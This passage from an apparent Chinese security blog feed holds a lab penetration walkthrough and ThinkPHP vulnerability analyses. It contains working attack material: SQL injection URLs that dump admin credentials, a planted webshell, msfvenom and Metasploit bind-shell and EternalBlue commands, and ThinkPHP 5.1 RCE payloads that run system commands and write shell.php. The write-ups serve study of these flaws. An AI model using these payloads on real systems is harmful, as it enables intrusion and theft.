alt="image-20240916171838815"></p><p>看到robots.txt</p><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916171928717.png" alt="image-20240916171928717"></p><p>访问是一个后台的登录框, 存在有验证码, 不好爆破</p><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916172155160.png" alt="image-20240916172155160"></p><p>看到首页的源代码, 存在提示, 可以sql注入,</p><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916172126831.png" alt="image-20240916172126831"></p><p>sqlmap跑一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 sqlmap -u &quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot; -p keyword -dbs</span><br></pre></td></tr></table></figure><p>非常不稳定, 跑不出来</p><p>手工注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.22.128/index.php?r=vul&amp;keyword=1&#x27; union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39 --+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.22.129/index.php?r=vul&amp;keyword=1%27%20union%20select%20group_concat(username),group_concat(password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39%20from%20bage_admin%23</span><br></pre></td></tr></table></figure><p>得到用户名, 密码</p><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916174443362.png" alt="image-20240916174443362"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">amdin</span><br><span class="line">46f94c8de14fb36680850768ff1b7f2a  ---&gt; 123qwe</span><br></pre></td></tr></table></figure><p>md5解密一下 , 登录到后台, 可以找到一个flag</p><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916174858409.png" alt="image-20240916174858409"></p><p>然后需要拿shell, 在模板里面可以写入, 在index.php里面写入一句话木马, 然后蚁剑连</p><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916180444023.png" alt="image-20240916180444023"></p><p>使用到sockscap这个工具, 代理<br><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916180340700.png" alt="image-20240916180340700"></p><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916180349133.png" alt="image-20240916180349133"></p><p>然后蚁剑就可以成功连接到了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">继续传马在msf拿shell，不过目标是在192.168.22.0网段，主动连我们肯定是连不上的，所以这里需要正向连，msf去连它</span><br></pre></td></tr></table></figure><p>生成正向后门</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=3333 -f elf &gt; 3.elf</span><br></pre></td></tr></table></figure><p>msf正向连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.22.129</span><br><span class="line">set LPORT 3333</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>将生成的3.elf上传到蚁剑的&#x2F;tmp目录下</p><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916180813069.png" alt="image-20240916180813069"></p><p>然后执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x 3.elf</span><br><span class="line">./3.elf</span><br></pre></td></tr></table></figure><p>接受到了对话</p><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916181803942.png" alt="image-20240916181803942"></p><p>继续之前的步骤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">获取网络接口：run get_local_subnets</span><br><span class="line">添加路由地址：run autoroute -s 192.168.33.0/24</span><br><span class="line">查看路由地址：run autoroute -p</span><br></pre></td></tr></table></figure><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916182309688.png" alt="image-20240916182309688"></p><h3 id="target3"><a href="#target3" class="headerlink" title="target3"></a>target3</h3><p>扫描33网段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -Pn -sT 192.168.33.33</span><br></pre></td></tr></table></figure><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916182734373.png" alt="image-20240916182734373"></p><p>开放了445和3389端口的windows系统<br>使用永恒之蓝试试</p><p>msf打永恒之蓝</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">background  </span><br><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set RHOST 192.168.33.33</span><br><span class="line">options</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>连接之后进入shell, 是乱码的, 需要chcp 65001修改一下编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">chcp 65001</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd /</span><br><span class="line">dir /S *flag* /B</span><br><span class="line">type C:\Users\Administrator\Desktop\flag.txt</span><br><span class="line"></span><br><span class="line">dir: 显示一个目录中的文件和子目录。</span><br><span class="line">/S: 显示指定目录下的所有子目录和文件。如果省略这个参数，dir 命令只会显示当前目录的内容。</span><br><span class="line">*flag*: 这是一个文件名的通配符搜索模式，意味着 dir 命令会搜索并列出所有包含“flag”字样的文件和目录。</span><br><span class="line">/B: 使用裸格式（即，不包含额外信息，只列出文件和目录的名称）。</span><br><span class="line">type: 用于显示文本文件的内容</span><br></pre></td></tr></table></figure><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916190117333.png" alt="image-20240916190117333"></p><p>就到这里结束了</p><p>参考文章</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_61237064/article/details/125602997</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp V5.1.x RCE</title>
      <link href="/2024/08/07/tp-V5.1.29/"/>
      <url>/2024/08/07/tp-V5.1.29/</url>
      
        <content type="html"><![CDATA[<p>影响范围:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TP 5.0.7 - 5.0.24</span><br><span class="line">TP 5.1.0 - 5.1.30</span><br></pre></td></tr></table></figure><p>环境:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">thinkphp5.1.29 + phpstorm</span><br><span class="line"></span><br><span class="line">下载tpv5.1.29的源码, 然后直接composer update</span><br></pre></td></tr></table></figure><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/?s=index/\think\Request/input&amp;filter[]=system&amp;data=whoami</span><br><span class="line"></span><br><span class="line">?s=index/\think\app/invokefunction?function=call_user_func&amp;vars[0]=system&amp;vars[1]=whoami</span><br><span class="line"></span><br><span class="line">?s=index/\think\request/input?data[]=-1&amp;filter=phpinfo</span><br><span class="line"></span><br><span class="line">写马:</span><br><span class="line">?s=index/\think\template\driver\file/write?cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E</span><br><span class="line">public目录下生成shell.php</span><br></pre></td></tr></table></figure><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行调试</span><br><span class="line">?s=index/\think\Request/input&amp;filter[]=system&amp;data=whoami</span><br></pre></td></tr></table></figure><p>在index.php中<br><img src="/2024/08/07/tp-V5.1.29/image-20240806211147218.png" alt="image-20240806211147218"></p><h2 id="进入到run-方法-App-php"><a href="#进入到run-方法-App-php" class="headerlink" title="进入到run() 方法 (App.php)"></a>进入到<code>run()</code> 方法 (App.php)</h2><p>在这里进行断点, 进行调试</p><p><img src="/2024/08/07/tp-V5.1.29/image-20240806212125097.png" alt="image-20240806212125097"></p><p><code>$dispatch = $this-&gt;dispatch;</code> 无初始值, 默认为空,  进入到 <code>routeCheck</code>方法</p><h3 id="routeCheck方法"><a href="#routeCheck方法" class="headerlink" title="routeCheck方法"></a><code>routeCheck</code>方法</h3><p><img src="/2024/08/07/tp-V5.1.29/image-20240806212506990.png" alt="image-20240806212506990"></p><h4 id="跟进到path-方法"><a href="#跟进到path-方法" class="headerlink" title="跟进到path()方法"></a>跟进到<code>path()</code>方法</h4><p><img src="/2024/08/07/tp-V5.1.29/image-20240806212715781.png" alt="image-20240806212715781"></p><h4 id="继续跟进到pathinfo-方法"><a href="#继续跟进到pathinfo-方法" class="headerlink" title="继续跟进到pathinfo()方法"></a>继续跟进到<code>pathinfo()</code>方法</h4><p><img src="/2024/08/07/tp-V5.1.29/image-20240806213015491.png" alt="image-20240806213015491"></p><p><code>$pathinfo</code>获取 当前类的<code>var_pathinfo</code> 的值–&gt;<code>s</code> ,所以可以通过 <code>?s</code> 参数传入值</p><p><img src="/2024/08/07/tp-V5.1.29/image-20240806213336785.png" alt="image-20240806213336785"></p><p>根据之前的传参, 此时就已经被赋值为 <code>index/\think\Request/input</code></p><p><img src="/2024/08/07/tp-V5.1.29/image-20240807194425137.png" alt="image-20240807194425137"></p><h3 id="继续回到routeCheck方法-继续向下"><a href="#继续回到routeCheck方法-继续向下" class="headerlink" title="继续回到routeCheck方法, 继续向下"></a>继续回到<code>routeCheck</code>方法, 继续向下</h3><p><img src="/2024/08/07/tp-V5.1.29/image-20240806214253673.png" alt="image-20240806214253673"></p><p>到路由检测里面去, 跟进route类的 <code>check()</code>方法</p><h4 id="check-方法"><a href="#check-方法" class="headerlink" title="check()方法"></a><code>check()</code>方法</h4><p><img src="/2024/08/07/tp-V5.1.29/image-20240806235511371.png" alt="image-20240806235511371"></p><p>经过一系列的检测后会返回一个 <code>UrlDispatch</code>类的对象 —&gt; Url类的对象<br><img src="/2024/08/07/tp-V5.1.29/image-20240806235751753.png" alt="image-20240806235751753"></p><p>继续,返回的对象, 进入到它的<code>init()</code>方法</p><h3 id="init-方法"><a href="#init-方法" class="headerlink" title="init()方法"></a><code>init()</code>方法</h3><p><img src="/2024/08/07/tp-V5.1.29/image-20240807000528123.png" alt="image-20240807000528123"></p><p>也就是<code>Url</code>类的<code>init()</code>方法<br><img src="/2024/08/07/tp-V5.1.29/image-20240807000119713.png" alt="image-20240807000119713"></p><p>接着进入到<code>parseUrl</code>方法</p><h4 id="parseUrl方法"><a href="#parseUrl方法" class="headerlink" title="parseUrl方法"></a><code>parseUrl</code>方法</h4><p><img src="/2024/08/07/tp-V5.1.29/image-20240807002019115.png" alt="image-20240807002019115"></p><p>将访问的url的信息拆分为三份 <code>$module</code>  <code>$controller</code>  <code>$action</code>返回</p><p>然后又会实例化一个<code>Module</code>类对象, 访问这个对象的<code>init()</code>方法</p><h4 id="Module类对象的init-方法"><a href="#Module类对象的init-方法" class="headerlink" title="Module类对象的init()方法"></a><code>Module</code>类对象的<code>init()</code>方法</h4><p><img src="/2024/08/07/tp-V5.1.29/image-20240807001210564.png" alt="image-20240807001210564"></p><p>进过一系列的操作<br><img src="/2024/08/07/tp-V5.1.29/image-20240807201708567.png" alt="image-20240807201708567"></p><p>最后返回的是当前实例化的对象 , 赋值给<code>$dispatch</code></p><h2 id="回到run方法"><a href="#回到run方法" class="headerlink" title="回到run方法"></a>回到<code>run</code>方法</h2><p>此时<code>$dispatch</code>是实例化的<code>Module</code>对象</p><p><img src="/2024/08/07/tp-V5.1.29/image-20240807200722916.png" alt="image-20240807200722916"></p><p><img src="/2024/08/07/tp-V5.1.29/image-20240807200833542.png" alt="image-20240807200833542"></p><p>程序继续向下执行</p><p><img src="/2024/08/07/tp-V5.1.29/image-20240807202556631.png" alt="image-20240807202556631"></p><p>此时<code>$data</code>为null, 又继续执行到<code>Module</code>类的 <code>run()</code>方法<br><img src="/2024/08/07/tp-V5.1.29/image-20240807202753426.png" alt="image-20240807202753426"></p><p>创建一个闭包函数，传入add()方法，然后将闭包函数作为中间件存入<code>$this-&gt;queue[$type][] = $middleware;</code></p><p><img src="/2024/08/07/tp-V5.1.29/image-20240807203826511.png" alt="image-20240807203826511"></p><p>继续向下执行</p><h3 id="进入到dispatch-方法"><a href="#进入到dispatch-方法" class="headerlink" title="进入到dispatch()方法"></a>进入到<code>dispatch()</code>方法</h3><p><img src="/2024/08/07/tp-V5.1.29/image-20240807203502814.png" alt="image-20240807203502814"></p><p>使用回调函数调用<code>resolve()</code>方法</p><h3 id="resolve"><a href="#resolve" class="headerlink" title="resolve()"></a>resolve()</h3><p><img src="/2024/08/07/tp-V5.1.29/image-20240807205231018.png" alt="image-20240807205231018"></p><p>将之前的闭包函数赋值给 <code>$middleware</code></p><p>到下面的call_func_array调用之前的闭包函数</p><p><img src="/2024/08/07/tp-V5.1.29/image-20240807205403025.png" alt="image-20240807205403025"></p><h3 id="进入到Dispatch类的run-方法"><a href="#进入到Dispatch类的run-方法" class="headerlink" title="进入到Dispatch类的run()方法"></a>进入到<code>Dispatch</code>类的<code>run()</code>方法</h3><p><img src="/2024/08/07/tp-V5.1.29/image-20240807211325739.png" alt="image-20240807211325739"></p><p>接着向下执行, 又会进入到  <code>exec</code>方法<br><img src="/2024/08/07/tp-V5.1.29/image-20240807211552487.png" alt="image-20240807211552487"></p><h3 id="Module类的exec-方法"><a href="#Module类的exec-方法" class="headerlink" title="Module类的exec()方法"></a><code>Module</code>类的<code>exec()</code>方法</h3><p><img src="/2024/08/07/tp-V5.1.29/image-20240807211752640.png" alt="image-20240807211752640"></p><h4 id="接着controller方法"><a href="#接着controller方法" class="headerlink" title="接着controller方法"></a>接着<code>controller</code>方法</h4><p><img src="/2024/08/07/tp-V5.1.29/image-20240807214023337.png" alt="image-20240807214023337"></p><h4 id="接着parseModuleAndClass方法"><a href="#接着parseModuleAndClass方法" class="headerlink" title="接着parseModuleAndClass方法"></a>接着<code>parseModuleAndClass</code>方法</h4><p><img src="/2024/08/07/tp-V5.1.29/image-20240807214101774.png" alt="image-20240807214101774"></p><p>关键点:</p><p><strong>如果控制器的名字中存在 <code>\</code>或者以<code>\</code>开头，会被会被当作一个类，可以实例化任意类</strong></p><p>回到<code>controller</code>方法，会检查类是否存在，存在就会去调用<code>__get()</code>方法</p><p><img src="/2024/08/07/tp-V5.1.29/image-20240807214240623.png" alt="image-20240807214240623"></p><p>然后是<code>make()</code>方法<br><img src="/2024/08/07/tp-V5.1.29/image-20240807214351143.png" alt="image-20240807214351143"></p><p><code>make</code>方法用来将类实例化</p><h3 id="继续回到exec-方法"><a href="#继续回到exec-方法" class="headerlink" title="继续回到exec()方法"></a>继续回到<code>exec()</code>方法</h3><p><img src="/2024/08/07/tp-V5.1.29/image-20240807214535357.png" alt="image-20240807214535357"></p><p>获取操作名，就是需要执行的实例化类的方法，然后方法里面对应的参数通过<code>get</code>请求传入</p><p>tp的路由规则是 ?s&#x3D;模块&#x2F;控制器&#x2F;操作名</p><p>寻找可以利用的类和方法 , 写shell或者执行命令</p><p>参考:</p><p><a href="https://xz.aliyun.com/t/9361?time__1311=n4+xnD0DuAKCqiKi=DkDlhjmYemwETh4DvUq=x#toc-3">https://xz.aliyun.com/t/9361?time__1311=n4%2BxnD0DuAKCqiKi%3DDkDlhjmYemwETh4DvUq%3Dx#toc-3</a></p><p><a href="https://xz.aliyun.com/t/9369?time__1311=n4+xnD0DuAKCqiKqD5DsA3o4xgDx90Z0E0poD">https://xz.aliyun.com/t/9369?time__1311=n4%2BxnD0DuAKCqiKqD5DsA3o4xgDx90Z0E0poD</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP V6.0.12多语言漏洞</title>
      <link href="/2024/08/05/tp-V6.0.12/"/>
      <url>/2024/08/05/tp-V6.0.12/</url>
      
        <content type="html"><![CDATA[<p>影响范围</p><p>6.0.1 &lt; ThinkPHP≤ 6.0.13</p><p>5.0.0 &lt; ThinkPHP≤ 5.0.12</p><p>5.1.0 &lt; ThinkPHP≤ 5.1.8</p><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><ul><li><p>安装并已知pearcmd.php的文件位置。（默认位置 &#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php，Docker版本的镜像中pear默认安装）</p></li><li><p>需要开启php.ini中register_argc_argv选项。（docker的PHP镜像是默认开启的）</p></li><li><p>thinkphp开启多语言功能 (app&#x2F;middleware.php)</p></li></ul><p><img src="/2024/08/05/tp-V6.0.12/image-20240803224836677.png" alt="image-20240803224836677"></p><ul><li>安装pear：</li></ul><p>1、下载 go-pear.phar  <a href="http://pear.php.net/go-pear.phar">http://pear.php.net/go-pear.phar</a></p><p>2、执行 php go-pear.phar 设置1-12选项路径，安装。</p><ul><li>直接docker部署环境</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name tp6 -p 8005:80 -d vulfocus/thinkphp:6.0.12</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>从LoadLangPack这个类开始</p><p><img src="/2024/08/05/tp-V6.0.12/image-20240805221247600.png" alt="image-20240805221247600"></p><p>每个 middleware 的 <code>handle()</code> 方法都会被调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"><span class="variable">$request</span>, <span class="built_in">Closure</span> <span class="variable">$next</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 自动侦测当前语言</span></span><br><span class="line">    <span class="variable">$langset</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">detect</span>(<span class="variable">$request</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;lang-&gt;<span class="title function_ invoke__">defaultLangSet</span>() != <span class="variable">$langset</span>) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lang-&gt;<span class="title function_ invoke__">switchLangSet</span>(<span class="variable">$langset</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">saveToCookie</span>(<span class="variable">$this</span>-&gt;app-&gt;cookie, <span class="variable">$langset</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$next</span>(<span class="variable">$request</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着进入到<code>detect()</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">detect</span>(<span class="params">Request <span class="variable">$request</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 自动侦测设置获取语言选择</span></span><br><span class="line">        <span class="variable">$langSet</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;detect_var&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">// url中设置了语言变量</span></span><br><span class="line">            <span class="variable">$langSet</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;detect_var&#x27;</span>]));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;header_var&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">// Header中设置了语言变量</span></span><br><span class="line">            <span class="variable">$langSet</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;header_var&#x27;</span>]));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">cookie</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;cookie_var&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">// Cookie中设置了语言变量</span></span><br><span class="line">            <span class="variable">$langSet</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">cookie</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;cookie_var&#x27;</span>]));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">server</span>(<span class="string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 自动侦测浏览器语言</span></span><br><span class="line">            <span class="variable">$match</span> = <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^([a-z\d\-]+)/i&#x27;</span>, <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">server</span>(<span class="string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>), <span class="variable">$matches</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$match</span>) &#123;</span><br><span class="line">                <span class="variable">$langSet</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$matches</span>[<span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;config[<span class="string">&#x27;accept_language&#x27;</span>][<span class="variable">$langSet</span>])) &#123;</span><br><span class="line">                    <span class="variable">$langSet</span> = <span class="variable language_">$this</span>-&gt;config[<span class="string">&#x27;accept_language&#x27;</span>][<span class="variable">$langSet</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>依次检查了<code>GET</code> <code>header</code> <code>cookie</code> ,没有任何过滤, 直接赋值给了 <code>$langSet</code></p><p>然后默认的情况下<code>allow_lang_list</code>为空</p><p><img src="/2024/08/05/tp-V6.0.12/image-20240805223124452.png" alt="image-20240805223124452"></p><p><code>$langSet</code>直接被赋值给了<code>$range</code> , 然后返回了<code>$range</code><br>继续回到 <code>handle()</code>里面<br><code>if ($this-&gt;lang-&gt;defaultLangSet() != $langset)</code></p><p><img src="/2024/08/05/tp-V6.0.12/image-20240805224025189.png" alt="image-20240805224025189"></p><p><img src="/2024/08/05/tp-V6.0.12/image-20240805223755079.png" alt="image-20240805223755079"></p><p>如果返回的<code>$range</code>–&gt;<code>$langset</code>不等于默认的<code>zh-cn</code> ,就会调用 <code>$this-&gt;lang-&gt;switchLangSet($langset)</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">switchLangSet</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$langset</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$langset</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载系统语言包</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">load</span>([</span><br><span class="line">        <span class="variable">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">getThinkPath</span>() . <span class="string">&#x27;lang&#x27;</span> . DIRECTORY_SEPARATOR . <span class="variable">$langset</span> . <span class="string">&#x27;.php&#x27;</span>,</span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载系统语言包</span></span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">glob</span>(<span class="variable">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">getAppPath</span>() . <span class="string">&#x27;lang&#x27;</span> . DIRECTORY_SEPARATOR . <span class="variable">$langset</span> . <span class="string">&#x27;.*&#x27;</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">load</span>(<span class="variable">$files</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载扩展（自定义）语言包</span></span><br><span class="line">    <span class="variable">$list</span> = <span class="variable language_">$this</span>-&gt;app-&gt;config-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;lang.extend_list&#x27;</span>, []);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$list</span>[<span class="variable">$langset</span>])) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">load</span>(<span class="variable">$list</span>[<span class="variable">$langset</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又调用了<code>load()</code>方法<br>传入的<code>$file</code>参数是拼接而成的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;app-&gt;getThinkPath() . &#x27;lang&#x27; . DIRECTORY_SEPARATOR . $langset . &#x27;.php&#x27;</span><br><span class="line"></span><br><span class="line">//DIRECTORY_SEPARATOR是一个PHP预定义常量，用于获取当前操作系统的目录分隔符</span><br></pre></td></tr></table></figure><p><img src="/2024/08/05/tp-V6.0.12/image-20240805225055542.png" alt="image-20240805225055542"></p><p><img src="/2024/08/05/tp-V6.0.12/image-20240805225035537.png"></p><p>也就是<code>thinkphp路径/lang/ + 参数$langset + .php</code><br>传入到<code>load()</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 